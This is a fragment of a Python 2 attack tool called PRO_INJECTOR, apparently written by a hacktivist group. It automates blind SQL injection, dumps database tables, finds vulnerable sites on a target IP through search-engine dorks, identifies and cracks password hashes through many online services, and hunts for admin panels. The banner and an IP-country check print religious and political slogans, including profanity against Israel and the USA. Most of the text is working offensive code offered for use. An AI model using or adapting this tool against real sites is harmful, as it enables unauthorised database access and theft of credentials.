                if arg_debug == "on":
                        print "\n[proxy]:",proxy_list_count[proxy_num % proxy_len]+"\n[agent]:",agent+"\n[debug]:",head_URL,"\n"
                try:
                        gets+=1;proxy_num+=1
                        source = proxy_list[proxy_num % proxy_len].open(request_web).read()
                except (KeyboardInterrupt, SystemExit):
                        raise
                except (urllib2.HTTPError):
                        print "[-] Unexpected error:", sys.exc_info()[0],"\n[-] Trying again!"
                        print "[proxy]:",proxy_list_count[proxy_num % proxy_len]+"\n[agent]:",agent+"\n[debug]:",head_URL,"\n"
                        break
                except:
                        print "[-] Unexpected error:", sys.exc_info()[0],"\n[-] Look at the error and try to figure it out!"
                        print "[proxy]:",proxy_list_count[proxy_num % proxy_len]+"\n[agent]:",agent+"\n[debug]:",head_URL,"\n"
                        raise
        return source

def GuessValue(URL):
        lower = lower_bound;upper = upper_bound
        while lower < upper:
                try:
                        mid = (lower + upper) / 2
                        head_URL = URL + ">"+str(mid)
                        source = GetThatShit(head_URL)
                        match = re.findall(arg_string,source)
                        if len(match) >= 1:
                                lower = mid + 1
                        else:
                                upper = mid                    
                except (KeyboardInterrupt, SystemExit):
                        raise
                except:
                        pass

        if lower > lower_bound and lower < upper_bound:
                value = lower
        else:
                head_URL = URL + "="+str(lower)
                source = GetThatShit(head_URL)
                match = re.findall(arg_string,source)
                if len(match) >= 1:
                        value = lower
                else:
                        value = 63
                        print "Could not find the ascii character! There must be a problem.."
                        print "Check to make sure your using the my script right!"
                        print "READ xprog's blind sql tutorial!\n"
                        sys.exit(1)
        return value


def CRC16():
    hs='4607'
    if len(hash)==len(hs) and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("101020")
def CRC16CCITT():
    hs='3d08'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("101040")
def FCS16():
    hs='0e5b'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("101060")

def CRC32():
    hs='b33fd057'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("102040")
def ADLER32():
    hs='0607cb42'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("102020")
def CRC32B():
    hs='b764a0d9'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("102060")
def XOR32():
    hs='0000003f'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("102080")



def c1(word): 
	s = hashlib.sha1() 
	s.update(word[:-1]) 
	s2 = hashlib.sha1() 
	s2.update(s.digest()) 
	return s2.hexdigest() 
 
def c2(word): 
	s = sha.new() 
	s.update(word[:-1]) 
	s2 = sha.new() 
	s2.update(s.digest()) 
	return s2.hexdigest()

def mysql323(clear):
    nr = 1345345333
    add = 7
    nr2 = 0x12345671
    retval = ""
    for c in clear:
        if c == ' ' or c == '\t':
            continue
        tmp = ord(c)
        nr ^= (((nr & 63) + add) * tmp) + (nr << 8)
        nr2 += (nr2 << 8) ^ nr
        add += tmp
    res1 = nr & ((1 << 31) - 1)
    res2 = nr2 & ((1 << 31) - 1)
    return "%08lx%08lx" % (res1, res2)


CRAKERS = [ 	SCHWETT,
		NETMD5CRACK,
		MD5_CRACKER,
		BENRAMSEY,
		GROMWEB,
		HASHCRACKING,
		VICTOROV,
		THEKAINE,
		TMTO,
		REDNOIZE,
		MD5_DB,
		MY_ADDR,
		MD5PASS,
		MD5DECRYPTION,
		MD5CRACK,
		MD5ONLINE,
		MD5_DECRYPTER,
		AUTHSECUMD5,
		HASHCRACK,
		OPHCRACK,
		C0LLISION,
		CMD5,
		AUTHSECUCISCO7,
		CACIN,
		IBEAST,
		PASSWORD_DECRYPT,
		BIGTRAPEZE,
		HASHCHECKER,
		MD5HASHCRACKER,
		PASSCRACKING,
		ASKCHECK,
		FOX21,
		NICENAMECREW,
		JOOMLAAA,
		MD5_LOOKUP,
		SHA1_LOOKUP,
		SHA256_LOOKUP,
		RIPEMD160_LOOKUP,
		MD5_COM_CN,
		DIGITALSUN,
		DRASEN,
		MYINFOSEC,
		MD5_NET,
		NOISETTE,
		MD5HOOD,
		STRINGFUNCTION,
		XANADREL,
		SANS,
		BOKEHMAN,
		GOOG_LI,
		WHREPORITORY ]

def configureCookieProcessor(cookiefile='/tmp/searchmyhash.cookie'):
	
	
	cookieHandler = LWPCookieJar()
	if cookieHandler is not None:
		if path.isfile (cookiefile):
			cookieHandler.load (cookiefile)
			
		opener = urllib2.build_opener ( urllib2.HTTPCookieProcessor(cookieHandler) )
		urllib2.install_opener (opener)



def do_HTTP_request (url, params={}, httpheaders={}):
	

	data = {}
	request = None
	
	if params:
		data = urlencode(params)

		request = urllib2.Request ( url, data, headers=httpheaders )
	else:
		request = urllib2.Request ( url, headers=httpheaders )
		
	try:
		response = urllib2.urlopen (request)
	except:
		return ""
	
	return response






def crackHash (algorithm, hashvalue=None, hashfile=None):
	
	
	global CRAKERS
	
	crackedhashes = []
	
	cracked = False
	
	if (not hashvalue and not hashfile) or (hashvalue and hashfile):
		return False
	
	hashestocrack = None
	if hashvalue:
		hashestocrack = [ hashvalue ]
	else:
		try:
			hashestocrack = open (hashfile, "r")
		except:
			print "\nIt is not possible to read input file (%s)\n" % (hashfile)
			return cracked
	
	
	
	for activehash in hashestocrack:
		hashresults = []
		
		
		activehash = activehash.strip()
		if algorithm not in [JUNIPER, LDAP_MD5, LDAP_SHA1]:
			activehash = activehash.lower()
		
		
		print "\nCracking HASH: %s\n" % (activehash) ; file.write("\nCracking HASH: %s\n" % (activehash))

		
		begin = randint(0, len(CRAKERS)-1)
		
		for i in range(len(CRAKERS)):
			
			
			cr = CRAKERS[ (i+begin)%len(CRAKERS) ]()
			
			
			if not cr.isSupported ( algorithm ):
				continue
			
			
			print "Analyzing With %s (%s)..." % (cr.name, cr.url)
			
			
			result = None
			try:
				result = cr.crack ( activehash, algorithm )
			except:
				print "\n Session Cancelled \n"
				if hashfile:
					try:
						hashestocrack.close()
					except:
						pass
				return False
			
			cracked = 0
			if result:
				
				if algorithm in [MD4, MD5, SHA1,  SHA224, SHA384, SHA256, SHA512, RIPEMD]:
					h = hashlib.new (algorithm)
					h.update (result)
					
					if h.hexdigest() == activehash:
						hashresults.append (result)
						cracked = 2
				
				elif algorithm in [LDAP_MD5, LDAP_SHA1]:
					alg = algorithm.split('_')[1]
					ahash =  decodestring ( activehash.split('}')[1] )
					
					h = hashlib.new (alg)
					h.update (result)
					
					if h.digest() == ahash:
						hashresults.append (result)
						cracked = 2
				
				elif algorithm == NTLM or (algorithm == LM and ':' in activehash):
					candidate = hashlib.new('md4', result.split()[-1].encode('utf-16le')).hexdigest()
					
					if (':' in activehash and candidate == activehash.split(':')[1]) or (':' not in activehash and candidate == activehash):
						hashresults.append (result)
						cracked = 2
				
				else:
					hashresults.append (result)
					cracked = 1
			
			if cracked:
				print "\n***** HASH CRACKED!! *****\nThe original string is: %s\n" % (result) 
				if cracked == 2:
					break
			else:
				print "... Hash Not Found in %s\n" % (cr.name)
		
		
		
		if hashresults:
			
			resultlist = []
			for r in hashresults:
				if r not in resultlist:
					resultlist.append (r)
					
			finalresult = ""
			if len(resultlist) > 1:
				finalresult = ', '.join (resultlist)
			else:
				finalresult = resultlist[0]
			
			crackedhashes.append ( (activehash, finalresult) )
	
	
	if hashfile:
		try:
			hashestocrack.close ()
		except:
			pass
		
	print "\nThe Following Hashes Were cracked:\n----------------------------------\n" ; file.write('\n-----------------------------------------------------')
	print crackedhashes and "\n".join ("%s >>>> %s" % (hashvalue, result.strip()) for hashvalue, result in crackedhashes) or "NO HASH WAS CRACKED." ; file.write(crackedhashes and "\n".join ("%s ==> %s" % (hashvalue, result.strip()) for hashvalue, result in crackedhashes) or "NO HASH WAS CRACKED.")
	print
	
	return cracked




def searchHash (hashvalue):
	
	
	start = 0
	finished = False
	results = []
	
	sys.stdout.write("\nThe hash wasn't found in any database. Maybe Google has any idea...\nLooking for results...")
	sys.stdout.flush()
	
	while not finished:
		
		sys.stdout.write('.')
		sys.stdout.flush()
	
		
		url = "http://www.google.com/search?hl=en&q=%s&filter=0" % (hashvalue)
		if start:
			url += "&start=%d" % (start)
			
		
		headers = { "User-Agent" : USER_AGENTS[randint(0, len(USER_AGENTS))-1] }
		
		response = do_HTTP_request ( url, httpheaders=headers )
		
		html = None
		if response:
			html = response.read()
		else:
			continue
			
		resultlist = findall (r'<a href="[^"]*?" class=l', html)
		
		new = False
		for r in resultlist:
			url_r = r.split('"')[1]
			
			if not url_r in results:
				results.append (url_r)
				new = True
		
		start += len(resultlist)
		
		if not new:
			finished = True
		
	
	if results:
		print "\n\nGoogle has some results. Maybe you would like to check them manually:\n"
		
		results.sort()
		for r in results:
			print "  *> %s" % (r)
		print
	
	else:
		print "\n\nGoogle doesn't have any result. Sorry!\n"


for arg in sys.argv:
   

   if arg == "-ip" :
        ip = sys.argv[count+1]
   elif arg == "-dork" :
        Dork = sys.argv[count+1]
   elif arg == "-hash" :
        hash = sys.argv[count+1]
   elif arg == "--a":
        mode = arg
   elif arg == "--v":
        mode = arg
   elif arg == "--p":
        mode = arg
   elif arg == "--l":
        mode = arg
   elif arg == "--adm":
        mode = arg
   elif arg == "-h" :
        mode = arg;algorithm = sys.argv[1].lower()
   elif arg == "-u" or arg == "--url":
        site = sys.argv[count+1]
   elif arg == "--output":
        logfile = sys.argv[count+1]
   elif arg == "--php":
        mode = arg  
   elif arg == "--asp":
        mode = arg 
   elif arg == "--cfm":
        mode = arg 
   elif arg == "--cgi":
        mode = arg 
   elif arg == "--brf":
        mode = arg 
   elif arg == "--proxy":
        proxy = sys.argv[count+1]
   elif arg == "--proxyauth":
        arg_proxy_auth = sys.argv[count+1]
   elif arg == "--dump":
        mode = arg;arg_dump = sys.argv[count]
   elif arg == "--full":
        mode = arg
   elif arg == "--schema":
        mode = arg;arg_schema = sys.argv[count]
   elif arg == "--dbs":
        mode = arg;arg_dbs = sys.argv[count]
   elif arg == "--fuzz":
        mode = arg;arg_fuzz = sys.argv[count]
   elif arg == "--info":
        mode = arg;arg_info = sys.argv[count]
   elif arg == "--crack":
        mode = arg;arg_hash = sys.argv[count+1]
   elif arg == "--wordlist":
        arg_wordlist = sys.argv[count+1] 
   elif arg == "--findcol":
        mode = arg;arg_findcol = sys.argv[count]
   elif arg == "--cookie":
        arg_cookie = sys.argv[count+1]
   elif arg == "--ssl":
        arg_ssl = "on"
   elif arg == "-b" or arg == "--blind":
        arg_blind = arg;arg_blind = sys.argv[count]
   elif arg == "-s" or arg == "--string":
        arg_string = sys.argv[count+1]
   elif arg == "-D":
        arg_database = sys.argv[count+1]
   elif arg == "-T":
        arg_table = sys.argv[count+1]
   elif arg == "-C":
        arg_columns = sys.argv[count+1]
   elif arg == "--start":
        num = int(sys.argv[count+1]) - 1
        table_num = num 
   elif arg == "-d" or arg == "--debug":
        arg_debug = "on"
   elif arg == "--where":
        arg_where = sys.argv[count+1]
   elif arg == "--orderby":
        arg_orderby = sys.argv[count+1]
   elif arg == "--rowdisp":
        arg_rowdisp = sys.argv[count]
        arg_rowdisp = 0
   elif arg == "--end":
        arg_end = sys.argv[count+1]
        if arg_end == "--":
            arg_eva = "+"
        else:
            arg_eva = "/**/"
   count+=1
   
if len(sys.argv) <= 1:
   print'''                                                       

                          #
                           ##            
                            ###
                          #  ####        
                           #  #####          
                           ##  ######
                           ###  ######
                          ####   ######
                         ###### ########
                       ##            ####
                  #  ##                ###  #
                 #  ##    ###########    ##  #
                ## ##    ##########      ##  ##
                ## ##    #  #########    ##  ##
                ## ## #      #########   ##  ##
                ##### ##      #########  ##  ##
                 #######  #    ############ ##
                  ######  ##    ########## ##
                   #### ####     ####### ##
                     ######       #### ##
                       #### ## ##  #### 
                          ## ## ## ## 
                                                                
                   
            #####   #####  ######   #########  ########                  
            ##  ## ##  ##  ##      ##########  ########                   
            ##    #    ##  ###### ##           ##    ##                
            ##         ##  ###### ##           ########           
            ##         ##  ##      ##########  ##    ##                      
            ##         ##  ######   #########  ##    ##                    
    {+} MIDDLE EAST CYBER ARMY! DX-PRO_INJECTOR (V 1.0){+} '''
   print '================================================================================'
   print '[*] This Tool Is Coded By RebelGhost Dx !                                      ||'
   print '[*] GreetZ To All Members 0f MECA And All Fans  !                              ||'
   print '[*] You can Scan All Sites of Any Server with Your Dork  !                     ||'
   print '[*] You can Find Admin Panel !                                                 ||'
   print '[*] You can Crack Hashes OnLine !                                              ||'
   print '[*] You can Inject With SQLi !                                                 ||'
   print '[*] You can Know Type Of Any Hash !                                            ||'
   print '[*] We Are MECA Team (Middle East Cyber Army) !                                ||'
   print '[*] CautioN : Dnt Use This Script Against Muslim Sites !                       ||'
   print '[*] CODER: https://www.facebook.com/AnonR.DX                                   ||'
   print "[+] PAGE :https://www.facebook.com/Middle.East.Cyber.Army.5                    ||"
   print '[+] TWITTER : https://twitter.com/MiddleEastCybe2                              ||'
   print '[+] IF YOU SEE ANY ERROR !! CONTACT US FOR HELP !!!!!!!!                       ||'
   print '================================================================================'
   print '                      >>>> --help TO GET HELP  <<<<                            '
   sys.exit(1)

print '\t[!]   Testing Your internet settings  [!] '

  

try :
   IL = [(s.connect(('8.8.8.8', 80)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
   BLOCK = 'http://whatismyipaddress.com/ip/'+IL
   SITE = urllib2.urlopen(BLOCK)
   HTML = SITE.read()
   PAT = re.compile ('<img [^>]*src="([^"]+)')
   LIEN = PAT.findall(HTML)
   if 'http://cdn.whatismyipaddress.com/images/flags/il.png' in  LIEN :

     print "\n\t\t IN THE NAME OF ALLAH "
     print "\n\t\t FREE GAZA"
     print "\n\t\t FREE PALASTINE "
     print "\n\t\t FUCK ISRAEL "
     print "\n\t\t FUCK USA "
     print "\n\t\t WE ARE MUSLIMS "
     sys.exit(1)
   else :
     print ' \t\t\t=================== '
     print ' \t\t\tHamdoulah it  Works  '
     print ' \t\t\t===================\n\n '


	
except urllib2.URLError:
    if mode == '--p' or mode == '--l' :
	       print ' \t\t\tThis OPTION is Work  Offline !!'
	       print '\t\t\t But Check Your internet settings For Lasts OPTIONS '
    elif arg == "--help":
			print ' \t\t\tCheck Your internet settings . Use All OPTIONS ' ;	 print '\n \t You   Can Use Just ID_HASH Offline '
			print '--------------- ' ; print 'ID_HASH OPTIONS ' ; print '--------------- '; print '      -hash HASH           HASH IF WANT KNOW IT ID'; print '      --p                  FOR GET ALL POSSIBLE HASHES'; print '      --l                  FOR GET LEAST POSSIBLE HASHES'
			sys.exit(1)
    else :
           print '	Session Cancelled  !!  Check   Your internet settings '
           sys.exit(1)
	
    

for arg in sys.argv:
        if arg == "--help":
           
           
		   print '     PRO_INJECTOR CODED BY  RebelGhost-DX From MECA TEAM '
		   print '                MIddle East Cyber Army '
		   print '     USAGE   :   ./PRO_INJECTOR.py [options]'
		   print ' -------------------------'
		   print '  IP_SQLi_FINDER OPTIONS : '
		   print ' -------------------------'
		   print '      -u URL, --url=URL    TARGET URL'
		   print '      -ip                  TARGET IP'
		   print '      -dork                ANY DORK SQLi YOU LIKE USE IT EX = ( id= )'
		   print '      --a                  FOR GET ALL LINKS FINDING BY YOUR DORK IN TARGET IP '
		   print '      --v                  FOR GET ALL LINKS VULN IN TARGET IP '
		   print ' ------------'
		   print ' SQLi OPTIONS:'
		   print ' ------------'
		   print '      -d, --debug          DISPLAY URL DEBUG INFORMATIO'
		   print '      -u URL, --url=URL    TARGET URL'
		   print '      -b, --blind          USE BLIND METHODOLOGY (req: --string)'
		   print '      -s, --string         STRING TO MATCH IN PAGE WHEN THE QUERY IS VALID'
		   print '      --crack=HASH         CRACK MySQL HASHES (req: --wordlist)'
		   print '      --wordlist=LIS.TXT   WORDLIST TO BE USED FOR CRACKING'
		   print '      --dump               DUMP DATABASE TABLE ENTRIES  (req: -T)'
		   print '      --schema             ENUMERATE INFORMATION_SCHEMA(req: -D)'
		   print '      --rowdisp            DO NOT DISPLAY ROW # WHEN DUMPING'
		   print '      --cookie=FILE.TXT    USEA MOZILLA COOKIE FILE'
		   print '      --proxy=PROXY        USE A HTTP PROXY TO CONNECT TO THE TARGET URL'
		   print '      --orderby=COL        USEA ORDER BY CLAUSE IN  YOUR DUMP'
		   print '      --output=FILE.TXT    OUTPUT RESULTS OF TOOL TO THIS FILE'
		   print '      --where=COL,VALUE    USE A WHERE CLAUSE IN YOUR DUMP'
		   print '      --start=ROW          ROW NEMBER TO BEGIN DUMPING AT'
		   print '      --method=PUT         SELECT TO USE PUT METHOD ** NOT WORKING'
		   print '      --dbs                ENUMERATE DATABASES           MySQL v5+'
		   print '                           OPT: -T)                      MySQL v5+'
		   print '      --full               ENUMERATE ALL THE TOOL  CAN   MySQL v5+'
		   print '      --info               MySQL SERVER CONFIGURATION    MySQL v4+'
		   print '      --fuzz               FUEE TABLES & COLUMNS NAMES   MySQL v4+'
		   print '      --findcol            FIND COLUMN LENGTH            MySQL v4+'
		   print '                      OPT: -D, -C, --start)         MySQL v4+'
		   print '      -D DB                DATABASE TO ENUMERATE'
		   print '      -T TBL               DATABASE TABLE TO ENUMERATE'
		   print '      -C COL               DATABASE TABLE COLUMN TO ENUMERATE'
		   print '      --ssl                TO USE SSL'
		   print '      --end                TO USE   +  AND -- FOR THE URLS --end \--\ (Default)'
		   print '                           TO USE /**/ AND /* FOR THE URLS --end \/*\ '
		   print ' ----------------'
		   print ' TYPE_HASH OPTIONS:'
		   print ' ----------------'
		   print '      -hash HASH           HASH IF WANT KNOW IT TYPE'
		   print '      --p                  FOR GET ALL POSSIBLE HASHES '
		   print '      --l                  FOR GET LEAST POSSIBLE HASHES'
		   print ' ---------------------'
		   print ' HACH_CRACKER OPTIONS:'
		   print ' ---------------------'
		   print '      -h HASH              IF YOU WANT TO CRACK ONE HASH'
		   print '      -f FILE.txt          IF YOU HAVE SEREVAL HASHEES'
		   print '    ALGORITHIMS : '
		   print '''   
		                     MD4       - RFC 1320
                             MD5       - RFC 1321
                             SHA1      - RFC 3174 (FIPS 180-3)
                             SHA224    - RFC 3874 (FIPS 180-3)
                             SHA256    - FIPS 180-3
                             SHA384    - FIPS 180-3
                             SHA512    - FIPS 180-3
                             RMD160    - RFC 2857
                             GOST      - RFC 5831
                             WHIRLPOOL - ISO/IEC 10118-3:2004
                             LM        - Microsoft Windows hash
                             NTLM      - Microsoft Windows hash
                             MYSQL     - MySQL 3, 4, 5 hash
                             CISCO7    - Cisco IOS type 7 encrypted passwords
                             JUNIPER   - Juniper Networks $9$ encrypted passwords
                             LDAP_MD5  - MD5 Base64 encoded
                             LDAP_SHA1 - SHA1 Base64 encoded '''
		   print '    EXAMPE :'
		   print '      ./PRO_INJECTOR.py MD5 -h 098f6bcd4621d373cade4e832627b4f6 '
		   print '      ./PRO_INJECTOR.py GOST -f GOST.txt'
		   print ' --------------------------'
		   print ' ADMIN_PANEL_FINDER OPTIONS:'
		   print ' --------------------------'
		   print '      -u URL, --url=URL     TARGET URL'
		   print '      --php                 FIND ADMIN PANEL PHP'
		   print '      --asp                 FIND ADMIN PANEL ASP'
		   print '      --cfm                 FIND ADMIN PANEL CFM'
		   print '      --cgi                 FIND ADMIN PANEL CGI '
		   print '      --brf                 FIND ADMIN PANEL BRF'
		   print '   #########################################################################'
		   print '   ## All  Results is Written In '+logfile+' Dnt Forget Check it ^_^ ##'
		   print '   #########################################################################'
		   sys.exit(1)

if mode == '--v' or mode == '--a' :
     if ip =="" :
		site = site.replace('http://','') ;site = site.replace('https://','') ; site = site.replace('/','')  ;  ip = socket.gethostbyname( site )

Dork = Dork.replace(' ','+')
Dork = Dork.replace("?",'%3F')
Dork = Dork.replace("=",'%3D')
Dork = Dork.replace(":",'%3A')
Dork = Dork.replace("/",'%2F')
Dork = Dork.replace("'",'%27')
Dork = Dork.replace("(",'%28')
Dork = Dork.replace(")",'%29')
Rebel = 'http://www.bing.com/search?q=ip%3a'
Ghost = '&go=Valider%2cValider&qs=ds%2cds&first='
Meca1  = Rebel+ip+'+'+Dork+Ghost+'1' ; Meca2 = Rebel+ip+'+'+Dork+Ghost+'11'; Meca3 = Rebel+ip+'+'+Dork+Ghost+'21' ; Meca4 = Rebel+ip+'+'+Dork+Ghost+'31'; Meca5 = Rebel+ip+'+'+Dork+Ghost+'41'
Meca6  = Rebel+ip+'+'+Dork+Ghost+'51' ; Meca7 = Rebel+ip+'+'+Dork+Ghost+'61' ; Meca8 = Rebel+ip+'+'+Dork+Ghost+'71'  ; Meca9 = Rebel+ip+'+'+Dork+Ghost+'81' ; Meca10 = Rebel+ip+'+'+Dork+Ghost+'91'
Meca11 = Rebel+ip+'+'+Dork+Ghost+'101' ; Meca12 = Rebel+ip+'+'+Dork+Ghost+'111'; Meca13 = Rebel+ip+'+'+Dork+Ghost+'121' ; Meca14 = Rebel+ip+'+'+Dork+Ghost+'131'; Meca15 = Rebel+ip+'+'+Dork+Ghost+'141'
Meca16 = Rebel+ip+'+'+Dork+Ghost+'151' ; Meca17 = Rebel+ip+'+'+Dork+Ghost+'161'; Meca18 = Rebel+ip+'+'+Dork+Ghost+'171' ; Meca19 = Rebel+ip+'+'+Dork+Ghost+'181'; Meca20 = Rebel+ip+'+'+Dork+Ghost+'191'
Meca21 = Rebel+ip+'+'+Dork+Ghost+'201' ; Meca22 = Rebel+ip+'+'+Dork+Ghost+'211'; Meca23 = Rebel+ip+'+'+Dork+Ghost+'221' ; Meca24 = Rebel+ip+'+'+Dork+Ghost+'231'; Meca25 = Rebel+ip+'+'+Dork+Ghost+'241'
Meca26 = Rebel+ip+'+'+Dork+Ghost+'251' ; Meca27 = Rebel+ip+'+'+Dork+Ghost+'261'; Meca28 = Rebel+ip+'+'+Dork+Ghost+'271' ; Meca29 = Rebel+ip+'+'+Dork+Ghost+'281'; Meca30 = Rebel+ip+'+'+Dork+Ghost+'291'
Meca31 = Rebel+ip+'+'+Dork+Ghost+'301' ; Meca32 = Rebel+ip+'+'+Dork+Ghost+'311'; Meca33 = Rebel+ip+'+'+Dork+Ghost+'321' ; Meca34 = Rebel+ip+'+'+Dork+Ghost+'331'; Meca35 = Rebel+ip+'+'+Dork+Ghost+'341'
Meca36 = Rebel+ip+'+'+Dork+Ghost+'351' ; Meca37 = Rebel+ip+'+'+Dork+Ghost+'361'; Meca38 = Rebel+ip+'+'+Dork+Ghost+'371' ; Meca39 = Rebel+ip+'+'+Dork+Ghost+'381'; Meca40 = Rebel+ip+'+'+Dork+Ghost+'391'
Meca41 = Rebel+ip+'+'+Dork+Ghost+'401' ; Meca42 = Rebel+ip+'+'+Dork+Ghost+'411'; Meca43 = Rebel+ip+'+'+Dork+Ghost+'421' ; Meca44 = Rebel+ip+'+'+Dork+Ghost+'431'; Meca45 = Rebel+ip+'+'+Dork+Ghost+'441'
Meca46 = Rebel+ip+'+'+Dork+Ghost+'451' ; Meca47 = Rebel+ip+'+'+Dork+Ghost+'461'; Meca48 = Rebel+ip+'+'+Dork+Ghost+'471' ; Meca49 = Rebel+ip+'+'+Dork+Ghost+'481'; Meca50 = Rebel+ip+'+'+Dork+Ghost+'491'
Islam=[]
Muslim=[]
D1=0 ; D2=0 ; D3=0 ; D4=0 ; D5=0; D6=0 ; D7=0 ; D8=0 ; D9=0 ; D10=0
D11=0 ; D12=0 ; D13=0 ; D14=0 ; D15=0; D16=0 ; D17=0 ; D18=0 ; D19=0 ; D20=0
D21=0 ; D22=0 ; D23=0 ; D24=0 ; D25=0; D26=0 ; D27=0 ; D28=0 ; D29=0 ; D30=0
D31=0 ; D32=0 ; D33=0 ; D34=0 ; D35=0; D36=0 ; D37=0 ; D38=0 ; D39=0 ; D40=0
D41=0 ; D42=0 ; D43=0 ; D44=0 ; D45=0; D46=0 ; D47=0 ; D48=0 ; D49=0 ; D50=0
x=0
Y=[]
b=0
See = []
def GREATEST(seq, idfun=None): 
   if idfun is None:
    def idfun(x): return x
    seen = {}
   for item in seq:
    marker = idfun(item)
    if marker in seen: continue
    seen[marker] = 1
    Muslim.append(item)
def RebelGhost(seq, idfun=None): 
   if idfun is None:
    def idfun(x): return x
    seen = {}
   for item in seq:
    marker = idfun(item)
    if marker in seen: continue
    seen[marker] = 1
    See.append(item)

def ANACONDA(Num,Var):
 Var[Num]=Var[Num].replace("http://www.microsofttranslator.com/","")
 Var[Num]=Var[Num].replace("http://go.microsoft.com/","")
 Var[Num]=Var[Num].replace("http://onlinehelp.microsoft.com","")
 Var[Num]=Var[Num].replace("javascript:","")
 
 
 if ':' in list(Var[Num])  :
  Islam.append(Var[Num])
  
def Kh_Mar404(Hunter,a):
 Bing = urllib2.urlopen(Hunter)
 Html = Bing.read()
 Pat= re.compile ('<a [^>]*href="([^"]+)')
 Lien = Pat.findall(Html)
 while a<len(Lien):
  ANACONDA(a,Lien)
  a=a+1

def Hajar() :
  
  Kh_Mar404(Meca1,D1); Kh_Mar404(Meca2,D2); Kh_Mar404(Meca3,D3); Kh_Mar404(Meca4,D4); Kh_Mar404(Meca5,D5)
  Kh_Mar404(Meca6,D6); Kh_Mar404(Meca7,D7); Kh_Mar404(Meca8,D8); Kh_Mar404(Meca9,D9); Kh_Mar404(Meca10,D10)
  Kh_Mar404(Meca11,D11) ; Kh_Mar404(Meca12,D12) ; Kh_Mar404(Meca13,D13) ; Kh_Mar404(Meca14,D14) ; Kh_Mar404(Meca15,D15)
  Kh_Mar404(Meca16,D16) ; Kh_Mar404(Meca17,D17) ; Kh_Mar404(Meca18,D18) ; Kh_Mar404(Meca19,D19) ; Kh_Mar404(Meca20,D20)
  Kh_Mar404(Meca21,D21) ; Kh_Mar404(Meca22,D22) ; Kh_Mar404(Meca23,D23) ; Kh_Mar404(Meca24,D24) ; Kh_Mar404(Meca25,D25)
  Kh_Mar404(Meca26,D26) ; Kh_Mar404(Meca27,D27) ; Kh_Mar404(Meca28,D28) ; Kh_Mar404(Meca29,D29) ; Kh_Mar404(Meca30,D30)
  Kh_Mar404(Meca31,D31) ; Kh_Mar404(Meca32,D32) ; Kh_Mar404(Meca33,D33) ; Kh_Mar404(Meca34,D34) ; Kh_Mar404(Meca35,D35)
  Kh_Mar404(Meca36,D36) ; Kh_Mar404(Meca37,D37) ; Kh_Mar404(Meca38,D38) ; Kh_Mar404(Meca39,D39) ; Kh_Mar404(Meca40,D40)
  Kh_Mar404(Meca41,D41) ; Kh_Mar404(Meca42,D42) ; Kh_Mar404(Meca43,D43) ; Kh_Mar404(Meca44,D44) ; Kh_Mar404(Meca45,D45)
  Kh_Mar404(Meca46,D46) ; Kh_Mar404(Meca47,D47) ; Kh_Mar404(Meca48,D48) ; Kh_Mar404(Meca49,D49) ; Kh_Mar404(Meca50,D40)
  GREATEST(Islam)

  

file = open(logfile, "a")

print '\t####################################################################'
print '\t## ^_^ Coded By RebelGhost-DX .. Middle East Cyber Army! Team ^_^ ##'   
print '\t##  ------------------------------------------------------------  ##'
print '\t## [!] PRO_INJECTOR.py [-] Profficional MySQL Injection Tool [!]  ##'
print '\t##  ------------------------------------------------------------  ##'
print '\t##  {!} MySQL_Injection_Tool [+] IP_SQli_Reserve [+] Id_Hash {!}  ## '
print '\t##      {!} Hash_Cracker_Online [+] Admin_Panel_Finder {!}        ## '
print '\t##  ------------------------------------------------------------  ##'
print '\t##  In The Name OF Allah !! ^_^ !! Free Gaza ! Free Palestine     ## '
print '\t####################################################################'
print '\t######################  '+strftime("%Y-%m-%d %H:%M:%S", gmtime())+'  #######################'
print '\t####################################################################'
print '\n\n\n'
                  
file.write("\n\n\n\t####################################################################")
file.write("\n\t## ^_^ Coded By RebelGhost-DX .. Middle East Cyber Army! Team ^_^ ##")
file.write("\n\t##  ------------------------------------------------------------  ##")
file.write("\n\t## [!] PRO_INJECTOR.py [-] Profficional MySQL Injection Tool [!]  ##")
file.write("\n\t##  ------------------------------------------------------------  ##")
file.write("\n\t##  {!} MySQL_Injection_Tool [+] IP_SQli_Reserve [+] Id_Hash {!}  ##")
file.write("\n\t##       {!} Hash_Cracker_Online [+] Admin_Panel_Finder {!}       ##")
file.write("\n\t##  ------------------------------------------------------------  ##")
file.write("\n\t##  In The Name OF Allah !! ^_^ !! Free Gaza ! Free Palestine     ##")
file.write("\n\t####################################################################")
file.write("\n\t######################  "+strftime("%Y-%m-%d %H:%M:%S", gmtime())+"  #######################")
file.write("\n\t#################################################################### \n\n\n")

if mode == "--p":
